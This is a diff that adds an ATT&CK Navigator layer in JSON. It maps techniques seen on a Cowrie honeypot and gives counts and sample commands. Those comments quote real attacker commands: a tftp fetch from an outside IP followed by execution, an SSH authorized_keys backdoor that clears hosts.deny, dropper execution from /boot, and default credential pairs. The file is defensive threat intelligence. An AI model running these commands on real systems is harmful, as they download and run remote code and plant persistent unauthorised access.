@@ -1,0 +1,87 @@
+{
+  "name": "Greyfield observed techniques",
+  "versions": {
+    "attack": "19.2",
+    "navigator": "5.1",
+    "layer": "4.5"
+  },
+  "domain": "enterprise-attack",
+  "description": "ATT&CK techniques mapped conservatively from Greyfield Cowrie observations; counts represent observed evidence, not attributed incidents.",
+  "techniques": [
+    {
+      "techniqueID": "T1059.004",
+      "score": 3750,
+      "comment": "sh; shell",
+      "enabled": true
+    },
+    {
+      "techniqueID": "T1110.001",
+      "score": 1170,
+      "comment": "enable\\x00 / linuxshell\\x00; admin / admin",
+      "enabled": true
+    },
+    {
+      "techniqueID": "T1222.002",
+      "score": 1119,
+      "comment": ">/boot/.f && chmod 777 /boot/.f && /boot/.f && cd /boot/;; >/data/.f && chmod 777 /data/.f && /data/.f && cd /data/;",
+      "enabled": true
+    },
+    {
+      "techniqueID": "T1083",
+      "score": 461,
+      "comment": "/bin/busybox cat /proc/self/exe || cat /proc/self/exe; cat /proc/cpuinfo | grep name | wc -l",
+      "enabled": true
+    },
+    {
+      "techniqueID": "T1082",
+      "score": 451,
+      "comment": "free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'; uname -a",
+      "enabled": true
+    },
+    {
+      "techniqueID": "T1105",
+      "score": 223,
+      "comment": "Malformed transfer reference withheld; (tftp -g 185.93.89.72 -r tftp -l- || busybox tftp -g 185.93.89.72 -r tftp -l-) > t; chmod 777 t; ./t; rm -rf t",
+      "enabled": true
+    },
+    {
+      "techniqueID": "T1070.004",
+      "score": 119,
+      "comment": "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~; rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;",
+      "enabled": true
+    },
+    {
+      "techniqueID": "T1098.004",
+      "score": 67,
+      "comment": "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
+      "enabled": true
+    },
+    {
+      "techniqueID": "T1057",
+      "score": 63,
+      "comment": "top; ps -ef | grep '[Mm]iner'",
+      "enabled": true
+    },
+    {
+      "techniqueID": "T1053.003",
+      "score": 61,
+      "comment": "crontab -l",
+      "enabled": true
+    },
+    {
+      "techniqueID": "T1016",
+      "score": 2,
+      "comment": "/ip cloud print; ifconfig",
+      "enabled": true
+    }
+  ],
+  "gradient": {
+    "colors": [
+      "#17131f",
+      "#7857ff",
+      "#ff5d73"
+    ],
+    "minValue": 0,
+    "maxValue": 3750
+  }
+}
